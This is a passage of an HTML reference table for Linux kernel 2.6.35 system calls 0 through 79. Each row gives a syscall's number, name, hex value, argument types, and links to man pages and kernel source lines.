rel="noopener">sys_restart_syscall</a></td><td>0x00</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2058" target="_blank" rel="noopener">kernel/signal.c:2058</a></td></tr><tr><td>1</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html" target="_blank" rel="noopener">sys_exit</a></td><td>0x01</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1046" target="_blank" rel="noopener">kernel/exit.c:1046</a></td></tr><tr><td>2</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html" target="_blank" rel="noopener">sys_fork</a></td><td>0x02</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L716" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:716</a></td></tr><tr><td>3</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html" target="_blank" rel="noopener">sys_read</a></td><td>0x03</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L391" target="_blank" rel="noopener">fs/read_write.c:391</a></td></tr><tr><td>4</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/write.2.html" target="_blank" rel="noopener">sys_write</a></td><td>0x04</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L408" target="_blank" rel="noopener">fs/read_write.c:408</a></td></tr><tr><td>5</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/open.2.html" target="_blank" rel="noopener">sys_open</a></td><td>0x05</td><td>const char __user *filename</td><td>int flags</td><td>int mode</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L900" target="_blank" rel="noopener">fs/open.c:900</a></td></tr><tr><td>6</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/close.2.html" target="_blank" rel="noopener">sys_close</a></td><td>0x06</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L969" target="_blank" rel="noopener">fs/open.c:969</a></td></tr><tr><td>7</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitpid.2.html" target="_blank" rel="noopener">sys_waitpid</a></td><td>0x07</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1771" target="_blank" rel="noopener">kernel/exit.c:1771</a></td></tr><tr><td>8</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/creat.2.html" target="_blank" rel="noopener">sys_creat</a></td><td>0x08</td><td>const char __user *pathname</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L933" target="_blank" rel="noopener">fs/open.c:933</a></td></tr><tr><td>9</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/link.2.html" target="_blank" rel="noopener">sys_link</a></td><td>0x09</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2520" target="_blank" rel="noopener">fs/namei.c:2520</a></td></tr><tr><td>10</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/unlink.2.html" target="_blank" rel="noopener">sys_unlink</a></td><td>0x0a</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2352" target="_blank" rel="noopener">fs/namei.c:2352</a></td></tr><tr><td>11</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener">sys_execve</a></td><td>0x0b</td><td>char __user *</td><td>char <strong>user *</strong>user *</td><td>char <strong>user *</strong>user *</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L925" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:925</a></td></tr><tr><td>12</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chdir.2.html" target="_blank" rel="noopener">sys_chdir</a></td><td>0x0c</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L361" target="_blank" rel="noopener">fs/open.c:361</a></td></tr><tr><td>13</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/time.2.html" target="_blank" rel="noopener">sys_time</a></td><td>0x0d</td><td>time_t __user *tloc</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855" target="_blank" rel="noopener">kernel/posix-timers.c:855</a></td></tr><tr><td>14</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mknod.2.html" target="_blank" rel="noopener">sys_mknod</a></td><td>0x0e</td><td>const char __user *filename</td><td>int mode</td><td>unsigned dev</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2067" target="_blank" rel="noopener">fs/namei.c:2067</a></td></tr><tr><td>15</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chmod.2.html" target="_blank" rel="noopener">sys_chmod</a></td><td>0x0f</td><td>const char __user *filename</td><td>mode_t mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L507" target="_blank" rel="noopener">fs/open.c:507</a></td></tr><tr><td>16</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown16.2.html" target="_blank" rel="noopener">sys_lchown16</a></td><td>0x10</td><td>const char __user *filename</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L27" target="_blank" rel="noopener">kernel/uid16.c:27</a></td></tr><tr><td>17</td><td>not implemented</td><td>0x11</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>18</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat.2.html" target="_blank" rel="noopener">sys_stat</a></td><td>0x12</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L150" target="_blank" rel="noopener">fs/stat.c:150</a></td></tr><tr><td>19</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lseek.2.html" target="_blank" rel="noopener">sys_lseek</a></td><td>0x13</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int origin</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L167" target="_blank" rel="noopener">fs/read_write.c:167</a></td></tr><tr><td>20</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpid.2.html" target="_blank" rel="noopener">sys_getpid</a></td><td>0x14</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1337" target="_blank" rel="noopener">kernel/timer.c:1337</a></td></tr><tr><td>21</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mount.2.html" target="_blank" rel="noopener">sys_mount</a></td><td>0x15</td><td>char __user *dev_name</td><td>char __user *dir_name</td><td>char __user *type</td><td>unsigned long flags</td><td>void __user *data</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2118" target="_blank" rel="noopener">fs/namespace.c:2118</a></td></tr><tr><td>22</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/oldumount.2.html" target="_blank" rel="noopener">sys_oldumount</a></td><td>0x16</td><td>char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1171" target="_blank" rel="noopener">fs/namespace.c:1171</a></td></tr><tr><td>23</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid16.2.html" target="_blank" rel="noopener">sys_setuid16</a></td><td>0x17</td><td>old_uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L67" target="_blank" rel="noopener">kernel/uid16.c:67</a></td></tr><tr><td>24</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid16.2.html" target="_blank" rel="noopener">sys_getuid16</a></td><td>0x18</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L212" target="_blank" rel="noopener">kernel/uid16.c:212</a></td></tr><tr><td>25</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stime.2.html" target="_blank" rel="noopener">sys_stime</a></td><td>0x19</td><td>time_t __user *tptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L81" target="_blank" rel="noopener">kernel/time.c:81</a></td></tr><tr><td>26</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ptrace.2.html" target="_blank" rel="noopener">sys_ptrace</a></td><td>0x1a</td><td>long request</td><td>long pid</td><td>long addr</td><td>long data</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/ptrace.c?v=2.6.35#L688" target="_blank" rel="noopener">kernel/ptrace.c:688</a></td></tr><tr><td>27</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/alarm.2.html" target="_blank" rel="noopener">sys_alarm</a></td><td>0x1b</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1314" target="_blank" rel="noopener">kernel/timer.c:1314</a></td></tr><tr><td>28</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat.2.html" target="_blank" rel="noopener">sys_fstat</a></td><td>0x1c</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/stat.h?v=2.6.35#L4" target="_blank" rel="noopener">struct __old_kernel_stat __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L174" target="_blank" rel="noopener">fs/stat.c:174</a></td></tr><tr><td>29</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pause.2.html" target="_blank" rel="noopener">sys_pause</a></td><td>0x1d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2700" target="_blank" rel="noopener">kernel/signal.c:2700</a></td></tr><tr><td>30</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utime.2.html" target="_blank" rel="noopener">sys_utime</a></td><td>0x1e</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utime.h?v=2.6.35#L6" target="_blank" rel="noopener">struct utimbuf __user *times</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L27" target="_blank" rel="noopener">fs/utimes.c:27</a></td></tr><tr><td>31</td><td>not implemented</td><td>0x1f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>32</td><td>not implemented</td><td>0x20</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>33</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/access.2.html" target="_blank" rel="noopener">sys_access</a></td><td>0x21</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L356" target="_blank" rel="noopener">fs/open.c:356</a></td></tr><tr><td>34</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nice.2.html" target="_blank" rel="noopener">sys_nice</a></td><td>0x22</td><td>int increment</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4282" target="_blank" rel="noopener">kernel/sched.c:4282</a></td></tr><tr><td>35</td><td>not implemented</td><td>0x23</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>36</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sync.2.html" target="_blank" rel="noopener">sys_sync</a></td><td>0x24</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/sync.c?v=2.6.35#L98" target="_blank" rel="noopener">fs/sync.c:98</a></td></tr><tr><td>37</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html" target="_blank" rel="noopener">sys_kill</a></td><td>0x25</td><td>int pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2317" target="_blank" rel="noopener">kernel/signal.c:2317</a></td></tr><tr><td>38</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rename.2.html" target="_blank" rel="noopener">sys_rename</a></td><td>0x26</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2765" target="_blank" rel="noopener">fs/namei.c:2765</a></td></tr><tr><td>39</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html" target="_blank" rel="noopener">sys_mkdir</a></td><td>0x27</td><td>const char __user *pathname</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2130" target="_blank" rel="noopener">fs/namei.c:2130</a></td></tr><tr><td>40</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rmdir.2.html" target="_blank" rel="noopener">sys_rmdir</a></td><td>0x28</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2244" target="_blank" rel="noopener">fs/namei.c:2244</a></td></tr><tr><td>41</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup.2.html" target="_blank" rel="noopener">sys_dup</a></td><td>0x29</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L131" target="_blank" rel="noopener">fs/fcntl.c:131</a></td></tr><tr><td>42</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html" target="_blank" rel="noopener">sys_pipe</a></td><td>0x2a</td><td>int __user *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/pipe.c?v=2.6.35#L1117" target="_blank" rel="noopener">fs/pipe.c:1117</a></td></tr><tr><td>43</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/times.2.html" target="_blank" rel="noopener">sys_times</a></td><td>0x2b</td><td>struct tms __user *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L896" target="_blank" rel="noopener">kernel/sys.c:896</a></td></tr><tr><td>44</td><td>not implemented</td><td>0x2c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>45</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html" target="_blank" rel="noopener">sys_brk</a></td><td>0x2d</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L245" target="_blank" rel="noopener">mm/mmap.c:245</a></td></tr><tr><td>46</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid16.2.html" target="_blank" rel="noopener">sys_setgid16</a></td><td>0x2e</td><td>old_gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L51" target="_blank" rel="noopener">kernel/uid16.c:51</a></td></tr><tr><td>47</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid16.2.html" target="_blank" rel="noopener">sys_getgid16</a></td><td>0x2f</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L222" target="_blank" rel="noopener">kernel/uid16.c:222</a></td></tr><tr><td>48</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/signal.2.html" target="_blank" rel="noopener">sys_signal</a></td><td>0x30</td><td>int sig</td><td>__sighandler_t handler</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2683" target="_blank" rel="noopener">kernel/signal.c:2683</a></td></tr><tr><td>49</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid16.2.html" target="_blank" rel="noopener">sys_geteuid16</a></td><td>0x31</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L217" target="_blank" rel="noopener">kernel/uid16.c:217</a></td></tr><tr><td>50</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid16.2.html" target="_blank" rel="noopener">sys_getegid16</a></td><td>0x32</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L227" target="_blank" rel="noopener">kernel/uid16.c:227</a></td></tr><tr><td>51</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/acct.2.html" target="_blank" rel="noopener">sys_acct</a></td><td>0x33</td><td>const char __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/acct.c?v=2.6.35#L274" target="_blank" rel="noopener">kernel/acct.c:274</a></td></tr><tr><td>52</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umount.2.html" target="_blank" rel="noopener">sys_umount</a></td><td>0x34</td><td>char __user *name</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L1132" target="_blank" rel="noopener">fs/namespace.c:1132</a></td></tr><tr><td>53</td><td>not implemented</td><td>0x35</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>54</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html" target="_blank" rel="noopener">sys_ioctl</a></td><td>0x36</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/ioctl.c?v=2.6.35#L613" target="_blank" rel="noopener">fs/ioctl.c:613</a></td></tr><tr><td>55</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl.2.html" target="_blank" rel="noopener">sys_fcntl</a></td><td>0x37</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L429" target="_blank" rel="noopener">fs/fcntl.c:429</a></td></tr><tr><td>56</td><td>not implemented</td><td>0x38</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>57</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setpgid.2.html" target="_blank" rel="noopener">sys_setpgid</a></td><td>0x39</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L921" target="_blank" rel="noopener">kernel/sys.c:921</a></td></tr><tr><td>58</td><td>not implemented</td><td>0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>59</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/olduname.2.html" target="_blank" rel="noopener">sys_olduname</a></td><td>0x3b</td><td><a href="http://lxr.free-electrons.com/source/include/linux/utsname.h?v=2.6.35#L6" target="_blank" rel="noopener">struct oldold_utsname __user *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1132" target="_blank" rel="noopener">kernel/sys.c:1132</a></td></tr><tr><td>60</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/umask.2.html" target="_blank" rel="noopener">sys_umask</a></td><td>0x3c</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1460" target="_blank" rel="noopener">kernel/sys.c:1460</a></td></tr><tr><td>61</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chroot.2.html" target="_blank" rel="noopener">sys_chroot</a></td><td>0x3d</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L408" target="_blank" rel="noopener">fs/open.c:408</a></td></tr><tr><td>62</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ustat.2.html" target="_blank" rel="noopener">sys_ustat</a></td><td>0x3e</td><td>unsigned dev</td><td><a href="http://lxr.free-electrons.com/source/include/linux/types.h?v=2.6.35#L200" target="_blank" rel="noopener">struct ustat __user *ubuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L175" target="_blank" rel="noopener">fs/statfs.c:175</a></td></tr><tr><td>63</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup2.2.html" target="_blank" rel="noopener">sys_dup2</a></td><td>0x3f</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/fcntl.c?v=2.6.35#L116" target="_blank" rel="noopener">fs/fcntl.c:116</a></td></tr><tr><td>64</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getppid.2.html" target="_blank" rel="noopener">sys_getppid</a></td><td>0x40</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1348" target="_blank" rel="noopener">kernel/timer.c:1348</a></td></tr><tr><td>65</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpgrp.2.html" target="_blank" rel="noopener">sys_getpgrp</a></td><td>0x41</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1020" target="_blank" rel="noopener">kernel/sys.c:1020</a></td></tr><tr><td>66</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsid.2.html" target="_blank" rel="noopener">sys_setsid</a></td><td>0x42</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1055" target="_blank" rel="noopener">kernel/sys.c:1055</a></td></tr><tr><td>67</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaction.2.html" target="_blank" rel="noopener">sys_sigaction</a></td><td>0x43</td><td>int sig</td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117" target="_blank" rel="noopener">const struct old_sigaction __user *act</a></td><td><a href="http://lxr.free-electrons.com/source/arch/arm/include/asm/signal.h?v=2.6.35#L117" target="_blank" rel="noopener">struct old_sigaction __user *oact</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/signal.c?v=2.6.35#L300" target="_blank" rel="noopener">arch/mips/kernel/signal.c:300</a></td></tr><tr><td>68</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sgetmask.2.html" target="_blank" rel="noopener">sys_sgetmask</a></td><td>0x44</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2657" target="_blank" rel="noopener">kernel/signal.c:2657</a></td></tr><tr><td>69</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ssetmask.2.html" target="_blank" rel="noopener">sys_ssetmask</a></td><td>0x45</td><td>int newmask</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2663" target="_blank" rel="noopener">kernel/signal.c:2663</a></td></tr><tr><td>70</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid16.2.html" target="_blank" rel="noopener">sys_setreuid16</a></td><td>0x46</td><td>old_uid_t ruid</td><td>old_uid_t euid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L59" target="_blank" rel="noopener">kernel/uid16.c:59</a></td></tr><tr><td>71</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid16.2.html" target="_blank" rel="noopener">sys_setregid16</a></td><td>0x47</td><td>old_gid_t rgid</td><td>old_gid_t egid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L43" target="_blank" rel="noopener">kernel/uid16.c:43</a></td></tr><tr><td>72</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigsuspend.2.html" target="_blank" rel="noopener">sys_sigsuspend</a></td><td>0x48</td><td>int history0</td><td>int history1</td><td>old_sigset_t mask</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/s390/kernel/signal.c?v=2.6.35#L58" target="_blank" rel="noopener">arch/s390/kernel/signal.c:58</a></td></tr><tr><td>73</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigpending.2.html" target="_blank" rel="noopener">sys_sigpending</a></td><td>0x49</td><td>old_sigset_t __user *set</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2562" target="_blank" rel="noopener">kernel/signal.c:2562</a></td></tr><tr><td>74</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sethostname.2.html" target="_blank" rel="noopener">sys_sethostname</a></td><td>0x4a</td><td>char __user *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1165" target="_blank" rel="noopener">kernel/sys.c:1165</a></td></tr><tr><td>75</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setrlimit.2.html" target="_blank" rel="noopener">sys_setrlimit</a></td><td>0x4b</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="noopener">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1275" target="_blank" rel="noopener">kernel/sys.c:1275</a></td></tr><tr><td>76</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/old_getrlimit.2.html" target="_blank" rel="noopener">sys_old_getrlimit</a></td><td>0x4c</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="noopener">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1256" target="_blank" rel="noopener">kernel/sys.c:1256</a></td></tr><tr><td>77</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrusage.2.html" target="_blank" rel="noopener">sys_getrusage</a></td><td>0x4d</td><td>int who</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="noopener">struct rusage __user *ru</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1452" target="_blank" rel="noopener">kernel/sys.c:1452</a></td></tr><tr><td>78</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/gettimeofday.2.html" target="_blank" rel="noopener">sys_gettimeofday</a></td><td>0x4e</td><td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="noopener">struct timeval __user *tv</a></td><td>struct timezone __user *tz</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/time.c?v=2.6.35#L101" target="_blank" rel="noopener">kernel/time.c:101</a></td></tr><tr><td>79</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/settimeofday.2.html" target="_blank" 